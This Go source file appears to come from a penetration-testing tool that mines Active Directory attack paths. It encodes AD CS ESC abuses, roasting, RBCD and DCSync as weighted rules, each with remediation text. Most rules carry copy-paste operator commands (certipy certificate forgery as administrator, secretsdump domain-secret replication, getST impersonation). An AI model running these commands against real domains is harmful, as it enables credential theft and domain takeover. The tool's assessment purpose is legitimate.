package analysis

import (
	"math"

	"orca/internal/model"
)

// Objective selects how hyperedges are weighted when mining a path.
type Objective string

const (
	Fastest   Objective = "fastest"   // fewest steps
	Quietest  Objective = "quietest"  // lowest OPSEC noise
	Reliable  Objective = "reliable"  // highest success probability
	Balanced  Objective = "balanced"  // blended default
	Practical Objective = "practical" // real-world exploitability: heavily penalizes unreliable primitives
)

// RuleMeta carries the exploitation knowledge attached to each primitive:
// its cost dimensions plus the operator-facing playbook.
type RuleMeta struct {
	ESC         string  // AD CS ESC label, if applicable
	Technique   string  // human-readable primitive name
	Difficulty  float64 // effort/skill, >= 0
	Reliability float64 // success probability, (0,1]
	Noise       float64 // detection footprint, >= 0
	CommandTmpl string  // copy-paste command; {A}=principal, {B}=target
	Remediation string  // client-report remediation guidance
	NarrativeTmpl string // operator-facing one-line description; {A}/{B}=head args, {P}=actor tail principal
	// TargetValuePenalty multiplies the edge cost when the derived fact's target
	// is a high-value principal. Default 1.0 (no penalty). Set >1 for primitives
	// whose reliability degrades sharply against well-defended targets (e.g.
	// offline cracking against strong passwords on high-value accounts).
	TargetValuePenalty float64
}

// weight returns the non-negative edge cost for an objective. Base facts
// (empty Technique via nil meta) cost zero and are handled by the caller.
func (m RuleMeta) weight(o Objective) float64 {
	// -log(reliability) turns "maximize product of reliabilities" into a sum we
	// can minimize; reliability in (0,1] keeps this >= 0.
	relCost := -math.Log(clamp01(m.Reliability))
	switch o {
	case Fastest:
		return 1
	case Quietest:
		return m.Noise + 0.01 // tiny tie-breaker so shorter paths win ties
	case Reliable:
		return relCost + 0.01
	case Practical:
		// Double the reliability weight to heavily penalize offline-cracking
		// primitives. -ln(0.05) ≈ 3.0 for Kerberoasting vs -ln(0.95) ≈ 0.05
		// for ESC1 — a 60x difference that makes multi-tool chains rank higher.
		return m.Difficulty + m.Noise + 2*relCost
	default: // Balanced
		return m.Difficulty + m.Noise + relCost
	}
}

func clamp01(f float64) float64 {
	if f <= 0 {
		return 0.0001
	}
	if f > 1 {
		return 1
	}
	return f
}

// RulePack returns Orca's M1 attack-primitive rules. Each derived capability is
// composed from atomic facts so that ESC chains (e.g. ESC4 -> ESC1) assemble
// themselves rather than being hard-coded, and cyclic entity relations converge
// at the fixpoint instead of looping.
func RulePack() []Rule {
	P, O, T, D := V("P"), V("O"), V("T"), V("D")
	CA, G := V("CA"), V("G")
	unary := func(p model.Pred, a Term) Atom { return Atom{Pred: p, A: a, Unary: true} }
	bin := func(p model.Pred, a, b Term) Atom { return Atom{Pred: p, A: a, B: b} }

	return []Rule{
		// ---- Transitive group membership. ----
		{
			Name: "member-transitive",
			Head: bin(model.MemberOf, P, V("G2")),
			Body: []Atom{bin(model.MemberOf, P, V("G1")), bin(model.MemberOf, V("G1"), V("G2"))},
			Meta: RuleMeta{Technique: "Nested group membership", Difficulty: 0, Reliability: 1, Noise: 0,
				NarrativeTmpl: "{A} gains membership in {B} via nested group nesting"},
		},

		// ---- ACL rights collapse into CanControl(P, O). ----
		ctrl("ctrl-owns", model.Owns, "Owns object", "{A} owns {B} and can seize it", 0.98, 1),
		ctrl("ctrl-genericall", model.GenericAll, "GenericAll", "{A} has GenericAll over {B}", 0.99, 1),
		ctrl("ctrl-writedacl", model.WriteDacl, "WriteDacl (grant self full control)", "{A} can rewrite {B}'s DACL to grant itself full control", 0.97, 2),
		ctrl("ctrl-writeowner", model.WriteOwner, "WriteOwner (set self owner)", "{A} can take ownership of {B}", 0.95, 2),
		ctrl("ctrl-genericwrite", model.GenericWrite, "GenericWrite", "{A} has GenericWrite over {B}", 0.9, 2),
		ctrl("ctrl-forcechangepw", model.ForceChangePassword, "Force password reset", "{A} can force a password reset on {B}", 0.95, 3),
		ctrl("ctrl-shadowcreds", model.AddKeyCredentialLink, "Shadow Credentials (msDS-KeyCredentialLink)", "{A} writes msDS-KeyCredentialLink to {B} (Shadow Credentials)", 0.9, 1),
		// NOTE: targeted kerberoast (ctrl-writespn / WriteSPN) is intentionally
		// omitted — kerberoasting is not considered a reliable path primitive
		// (offline crack success depends on a strong/unknown password), so it is
		// excluded from attack paths entirely. See the kerberoast rule below.

		// ---- Capability propagation from a compromised principal. ----
		{
			Name: "compromise-via-control",
			Head: unary(model.Compromised, O),
			Body: []Atom{unary(model.Compromised, P), bin(model.CanControl, P, O)},
			Meta: RuleMeta{
				Technique:   "Abuse object control",
				Difficulty:  1, Reliability: 0.97, Noise: 2,
				CommandTmpl: "# pivot: exercise the control right established above to seize {A}",
				Remediation: "Restrict which principals can control {A}.",
				NarrativeTmpl: "{P} abuses its control right to compromise {A}",
			},
		},
		{
			Name: "compromise-via-membership",
			Head: unary(model.Compromised, V("G")),
			Body: []Atom{unary(model.Compromised, P), bin(model.MemberOf, P, V("G"))},
			Meta: RuleMeta{
				Technique:  "Inherit group privileges",
				Difficulty: 0, Reliability: 1, Noise: 0,
				Remediation: "Review membership of {A}; enforce least privilege.",
				NarrativeTmpl: "{P} inherits {A}'s privileges through group membership",
			},
		},
		{
			Name: "compromise-via-addmember",
			Head: unary(model.Compromised, V("G")),
			Body: []Atom{unary(model.Compromised, P), bin(model.AddMember, P, V("G"))},
			Meta: RuleMeta{
				Technique:   "Add self to group",
				Difficulty:  0.5, Reliability: 0.99, Noise: 2,
				CommandTmpl: "bloodyAD add groupMember \"{A}\" <controlled-principal>   # add yourself to {A}",
				Remediation: "Remove AddMember/write rights over group {A} from unprivileged principals.",
				NarrativeTmpl: "{P} adds itself to {A} to inherit its privileges",
			},
		},

		// ---- AS-REP roast: no pre-auth required, crack the AS-REP offline. ----
		// (Kerberoasting — the direct `kerberoast` rule and targeted WriteSPN
		// kerberoast — is deliberately excluded from attack paths. Offline crack
		// success depends on the target's password strength, which is unknown and
		// frequently strong for service/high-value accounts, so kerberoasting is
		// not treated as a reliable path primitive. AS-REP roasting is retained
		// because no-pre-auth is an unambiguous misconfiguration, not a crack
		// gamble against an arbitrary SPN account.)
		{
			Name: "asrep-roast",
			Head: unary(model.Compromised, V("U")),
			Body: []Atom{unary(model.Compromised, P), unary(model.ASREPRoastable, V("U"))},
			Meta: RuleMeta{
				Technique:   "AS-REP roast + offline crack",
				Difficulty:  1, Reliability: 0.08, Noise: 1,
				TargetValuePenalty: 3.0,
				CommandTmpl: "GetNPUsers.py -request -dc-ip <DC> '<domain>/' -usersfile <(echo {A})   # then hashcat -m 18200",
				Remediation: "Enable 'Kerberos pre-authentication' for {A}.",
				NarrativeTmpl: "{P} AS-REP roasts {A} (no pre-auth) and cracks the response offline",
			},
		},

		// ---- Resource-Based Constrained Delegation. ----
		{
			Name: "rbcd-impersonate",
			Head: unary(model.Compromised, V("C")),
			Body: []Atom{unary(model.Compromised, P), bin(model.AllowedToAct, P, V("C"))},
			Meta: RuleMeta{
				Technique:   "RBCD S4U2Self/S4U2Proxy impersonation",
				Difficulty:  2, Reliability: 0.9, Noise: 3,
				CommandTmpl: "getST.py -spn cifs/{A} -impersonate Administrator -dc-ip <DC> '<domain>/<controlled-account>'",
				Remediation: "Clear msDS-AllowedToActOnBehalfOfOtherIdentity on {A}.",
				NarrativeTmpl: "{P} uses RBCD to impersonate a privileged user against {A}",
			},
		},

		// ---- AD CS ESC1: enroll a client-auth cert with attacker-supplied SAN. ----
		{
			Name: "esc1",
			Head: bin(model.CanEnrollAsAnyone, P, T),
			Body: []Atom{
				bin(model.CanEnroll, P, T),
				unary(model.TemplateEnrolleeSuppliesSubject, T),
				unary(model.TemplateAuthEKU, T),
				unary(model.TemplateNoManagerApproval, T),
				unary(model.CAReachable, T),
			},
			Meta: RuleMeta{
				ESC:         "ESC1",
				Technique:   "Enroll certificate as arbitrary principal (ENROLLEE_SUPPLIES_SUBJECT)",
				Difficulty:  1, Reliability: 0.95, Noise: 2,
				CommandTmpl: "certipy req -u {A} -template <tmpl:{B}> -upn administrator@<domain> -ca <CA>",
				Remediation: "Disable ENROLLEE_SUPPLIES_SUBJECT on template {B} or require manager approval.",
				NarrativeTmpl: "{A} enrolls in template {B} with an attacker-supplied SAN (ENROLLEE_SUPPLIES_SUBJECT)",
			},
		},
		// ---- AD CS ESC4: control the template, then it IS ESC1. Composes with esc1
		//      via CanControl -> (rewrite template) -> CanEnrollAsAnyone. ----
		{
			Name: "esc4",
			Head: bin(model.CanEnrollAsAnyone, P, T),
			Body: []Atom{
				unary(model.Compromised, P),
				bin(model.CanControl, P, T),
				unary(model.IsTemplate, T),
				unary(model.CAReachable, T),
			},
			Meta: RuleMeta{
				ESC:         "ESC4",
				Technique:   "Rewrite controllable template into ESC1, then enroll",
				Difficulty:  1.5, Reliability: 0.93, Noise: 2,
				CommandTmpl: "certipy template -u {A} -template <tmpl:{B}> -write-default-configuration",
				Remediation: "Remove write access of {A} over certificate template {B}.",
				NarrativeTmpl: "{A} rewrites controllable template {B} into an ESC1 config, then enrolls",
			},
		},
		// CanEnrollAsAnyone yields compromise of any user (auth as that user).
		{
			Name: "adcs-auth-as-anyone",
			Head: unary(model.Compromised, V("V")),
			Body: []Atom{unary(model.Compromised, P), bin(model.CanEnrollAsAnyone, P, T), unary(model.IsUser, V("V"))},
			Meta: RuleMeta{
				Technique:   "Authenticate with forged-SAN certificate (PKINIT)",
				Difficulty:  0.5, Reliability: 0.95, Noise: 1,
				CommandTmpl: "certipy auth -pfx {A}.pfx -dc-ip <DC>   # obtain TGT/NT hash for {A}",
				Remediation: "See the ESC finding on the template used in this path.",
				NarrativeTmpl: "{P} authenticates with a forged-SAN certificate to impersonate {A}",
			},
		},

		// ---- DCSync: GetChanges + GetChangesAll on the domain. ----
		{
			Name: "dcsync",
			Head: bin(model.CanDCSync, P, D),
			Body: []Atom{bin(model.HasGetChanges, P, D), bin(model.HasGetChangesAll, P, D)},
			Meta: RuleMeta{
				Technique:  "DCSync (DS-Replication-Get-Changes-All)",
				Difficulty: 1, Reliability: 0.99, Noise: 4,
				NarrativeTmpl: "{A} holds DCSync rights on domain {B}",
			},
		},
		{
			Name: "dcsync-domain-compromise",
			Head: unary(model.Compromised, D),
			Body: []Atom{unary(model.Compromised, P), bin(model.CanDCSync, P, D), unary(model.IsDomain, D)},
			Meta: RuleMeta{
				Technique:   "Replicate all domain secrets (krbtgt)",
				Difficulty:  1, Reliability: 0.99, Noise: 4,
				CommandTmpl: "secretsdump.py -just-dc '<domain>/<compromised-principal>@<DC>'   # replicates {A}",
				Remediation: "Remove replication rights (GetChanges/GetChangesAll) on {A} from non-DC principals.",
				NarrativeTmpl: "{P} replicates all domain secrets from {A} (krbtgt)",
			},
		},

		// ---- AD CS ESC2: Any Purpose / empty EKU + ENROLLEE_SUPPLIES_SUBJECT. ----
		// The enrollee supplies the SAN and the EKU places no authentication
		// restriction, so the issued cert authenticates as any principal.
		{
			Name: "esc2",
			Head: bin(model.CanEnrollAsAnyone, P, T),
			Body: []Atom{
				bin(model.CanEnroll, P, T),
				unary(model.TemplateAnyEKU, T),
				unary(model.TemplateEnrolleeSuppliesSubject, T),
				unary(model.TemplateNoManagerApproval, T),
				unary(model.CAReachable, T),
			},
			Meta: RuleMeta{
				ESC:         "ESC2",
				Technique:   "Enroll Any-Purpose cert with attacker SAN (no EKU restriction)",
				Difficulty:  1, Reliability: 0.95, Noise: 2,
				CommandTmpl: "certipy req -u {A} -template <tmpl:{B}> -upn administrator@<domain> -ca <CA>",
				Remediation: "Restrict the EKU on template {B} and disable ENROLLEE_SUPPLIES_SUBJECT.",
				NarrativeTmpl: "{A} enrolls in Any-Purpose template {B} with an attacker-supplied SAN (no EKU restriction)",
			},
		},

		// ---- AD CS ESC3 (two-stage): enrollment agent cert, then sign as anyone. ----
		// esc3a: P enrolls in an enrollment-agent template → P can act as an agent.
		{
			Name: "esc3a",
			Head: unary(model.CanActAsEnrollmentAgent, P),
			Body: []Atom{
				bin(model.CanEnroll, P, T),
				unary(model.TemplateEnrollmentAgentEKU, T),
				unary(model.TemplateNoManagerApproval, T),
				unary(model.CAReachable, T),
			},
			Meta: RuleMeta{
				ESC:         "ESC3",
				Technique:   "Obtain Enrollment Agent certificate",
				Difficulty:  1.2, Reliability: 0.9, Noise: 2,
				CommandTmpl: "certipy req -u {A} -template <tmpl:{B}> -ca <CA>   # enrollment-agent cert",
				Remediation: "Restrict who can enroll in enrollment-agent template {B}.",
				NarrativeTmpl: "{A} obtains an Enrollment Agent certificate (enrollment-agent template)",
			},
		},
		// esc3b: an enrollment agent signs a request for a target template that
		// requires an agent signature → cert authenticates as any user.
		{
			Name: "esc3b",
			Head: bin(model.CanEnrollAsAnyone, P, T),
			Body: []Atom{
				unary(model.CanActAsEnrollmentAgent, P),
				bin(model.CanEnroll, P, T),
				unary(model.TemplateRequiresAgentSignature, T),
				unary(model.TemplateAuthEKU, T),
				unary(model.TemplateNoManagerApproval, T),
				unary(model.CAReachable, T),
			},
			Meta: RuleMeta{
				ESC:         "ESC3",
				Technique:   "Enroll as Enrollment Agent on behalf of an arbitrary principal",
				Difficulty:  1.5, Reliability: 0.88, Noise: 2,
				CommandTmpl: "certipy req -u {A} -template <tmpl:{B}> -on-behalf-of 'CORP\\administrator' -ca <CA>",
				Remediation: "Restrict enrollment-agent templates and who can sign requests for template {B}.",
				NarrativeTmpl: "{A} enrolls via template {B} as an Enrollment Agent on behalf of an arbitrary principal",
			},
		},

		// ---- AD CS ESC5: control of a CA yields control of its domain. ----
		// esc5: a compromised principal that controls a CA compromises the CA.
		{
			Name: "esc5",
			Head: unary(model.Compromised, CA),
			Body: []Atom{
				unary(model.Compromised, P),
				bin(model.CanControl, P, CA),
				unary(model.IsCA, CA),
			},
			Meta: RuleMeta{
				ESC:         "ESC5",
				Technique:   "Seize control of the certificate authority",
				Difficulty:  1.5, Reliability: 0.95, Noise: 3,
				CommandTmpl: "# abuse {A} control rights over CA {B} to alter its configuration",
				Remediation: "Remove control rights over CA {B} from non-privileged principals.",
				NarrativeTmpl: "{P} seizes control of certificate authority {A}",
			},
		},
		// esc5-domain: a compromised CA can issue any cert → its domain is owned.
		{
			Name: "esc5-domain",
			Head: unary(model.Compromised, D),
			Body: []Atom{
				unary(model.Compromised, CA),
				bin(model.CAInDomain, CA, D),
				unary(model.IsDomain, D),
			},
			Meta: RuleMeta{
				ESC:         "ESC5",
				Technique:   "Compromise domain via controlled CA (issue cert as DA)",
				Difficulty:  1.5, Reliability: 0.9, Noise: 3,
				CommandTmpl: "# with control of CA {A}, issue a certificate for a domain admin of {B}",
				Remediation: "Tier-0 the CA host and restrict CA officer rights; treat CA compromise as domain compromise.",
				NarrativeTmpl: "Controlled certificate authority {P} issues a cert to compromise domain {A}",
			},
		},

		// ---- AD CS ESC6: CA EDITF_ATTRIBUTESUBJECTALTNAME2 → SAN override on any
		// issued template, so any enrollee can authenticate as anyone. ----
		{
			Name: "esc6",
			Head: bin(model.CanEnrollAsAnyone, P, T),
			Body: []Atom{
				bin(model.CanEnroll, P, T),
				bin(model.PublishedOn, T, CA),
				unary(model.CAEditfSan2, CA),
				unary(model.TemplateAuthEKU, T),
				unary(model.TemplateNoManagerApproval, T),
			},
			Meta: RuleMeta{
				ESC:         "ESC6",
				Technique:   "Enroll with CA-imposed SAN override (EDITF_ATTRIBUTESUBJECTALTNAME2)",
				Difficulty:  1, Reliability: 0.9, Noise: 3,
				CommandTmpl: "certipy req -u {A} -template <tmpl:{B}> -upn administrator@<domain> -ca <CA>   # SAN forced by CA",
				Remediation: "Clear EDITF_ATTRIBUTESUBJECTALTNAME2 on CA {B}; it allows SAN override on every issued cert.",
				NarrativeTmpl: "{A} enrolls in template {B}; the CA forces an attacker SAN (EDITF_ATTRIBUTESUBJECTALTNAME2)",
			},
		},

		// ---- AD CS ESC8 (advisory, never a compromise step): web enrollment
		// reachable over NTLM (no EPA) is exposed to NTLM relay + coercion. ----
		{
			Name: "esc8-advisory",
			Head: unary(model.RelayExposure, CA),
			Body: []Atom{
				unary(model.WebEnrollmentEnabled, CA),
				unary(model.HttpRelayCapable, CA),
			},
			Meta: RuleMeta{
				ESC:         "ESC8",
				Technique:   "NTLM relay / coercion exposure via web enrollment (advisory)",
				Difficulty:  2, Reliability: 0.5, Noise: 4,
				CommandTmpl: "# coerce or relay NTLM to {B}'s web enrollment endpoint to obtain an auth cert",
				Remediation: "Disable web enrollment on CA {B} or require Extended Protection for Authentication (EPA).",
				NarrativeTmpl: "CA {A} exposes web enrollment over NTLM without EPA (relay/coercion risk)",
			},
		},

		// ---- AD CS ESC11: CA does not enforce request signatures + template
		// supplies subject → enrollee can forge the SAN without a signature. ----
		{
			Name: "esc11",
			Head: bin(model.CanEnrollAsAnyone, P, T),
			Body: []Atom{
				bin(model.CanEnroll, P, T),
				bin(model.PublishedOn, T, CA),
				unary(model.NoSignatureEnforcement, CA),
				unary(model.TemplateAuthEKU, T),
				unary(model.TemplateNoManagerApproval, T),
				unary(model.TemplateEnrolleeSuppliesSubject, T),
			},
			Meta: RuleMeta{
				ESC:         "ESC11",
				Technique:   "Enroll with forged SAN (CA does not enforce request signatures)",
				Difficulty:  1, Reliability: 0.9, Noise: 3,
				CommandTmpl: "certipy req -u {A} -template <tmpl:{B}> -upn administrator@<domain> -ca <CA>",
				Remediation: "Enable signature enforcement on CA {B} (EDITF_REQUIREEXACT/SCEP request signing).",
				NarrativeTmpl: "{A} enrolls in template {B} with a forged SAN (CA does not enforce request signatures)",
			},
		},

		// ---- AD CS ESC13: template issuance policy links to a privileged group;
		// enrolling yields a cert treated as membership in that group. ----
		{
			Name: "esc13",
			Head: unary(model.Compromised, G),
			Body: []Atom{
				unary(model.Compromised, P),
				bin(model.CanEnroll, P, T),
				bin(model.TemplateIssuancePolicyLinksToPrivilege, T, G),
				unary(model.TemplateAuthEKU, T),
				unary(model.TemplateNoManagerApproval, T),
				unary(model.CAReachable, T),
				unary(model.HighValue, G),
			},
			Meta: RuleMeta{
				ESC:         "ESC13",
				Technique:   "Enroll to gain privileged group membership via issuance-policy link",
				Difficulty:  1.3, Reliability: 0.85, Noise: 2,
				CommandTmpl: "certipy req -u {A} -template <tmpl:{B}> -ca <CA>   # cert grants group {A} membership",
				Remediation: "Remove the issuance-policy-to-group link on template {B} or restrict enrollment.",
				NarrativeTmpl: "{P} enrolls in a template whose issuance policy grants membership in privileged group {A}",
			},
		},
	}
}

// ctrl builds a "CanControl(P,O) :- <right>(P,O)" rule with the given metadata.
func ctrl(name string, right model.Pred, tech, narrative string, rel, noise float64) Rule {
	P, O := V("P"), V("O")
	return Rule{
		Name: name,
		Head: Atom{Pred: model.CanControl, A: P, B: O},
		Body: []Atom{{Pred: right, A: P, B: O}},
		Meta: RuleMeta{
			Technique: tech, Difficulty: 1, Reliability: rel, Noise: noise,
			Remediation:    "Remove the " + string(right) + " right of {A} over {B}.",
			NarrativeTmpl:  narrative,
		},
	}
}

// ctrlHV is like ctrl but sets a TargetValuePenalty for primitives whose
// reliability degrades against high-value targets (e.g. targeted kerberoast).
func ctrlHV(name string, right model.Pred, tech, narrative string, rel, noise, tvp float64) Rule {
	r := ctrl(name, right, tech, narrative, rel, noise)
	r.Meta.TargetValuePenalty = tvp
	return r
}
